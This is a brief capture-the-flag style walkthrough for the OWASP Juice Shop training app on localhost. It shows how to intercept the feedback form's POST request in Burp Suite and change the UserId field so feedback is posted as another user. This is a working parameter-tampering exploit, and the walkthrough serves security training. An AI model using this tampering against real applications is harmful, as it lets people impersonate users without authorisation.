- Go to http://localhost:3000/#/contact
- Enter all details
- Turn Intercept on in burpsuite
- Click submit
```
POST /api/Feedbacks/ HTTP/1.1
[...]
{"UserId":1,"captchaId":9,"captcha":"72","comment":"Test (***in@juice-sh.op)","rating":5}
```
- Change `UserId`
```
{"UserId":2,"captchaId":9,"captcha":"72","comment":"Test (***in@juice-sh.op)","rating":5}
```
- Click forward
- Complete challenge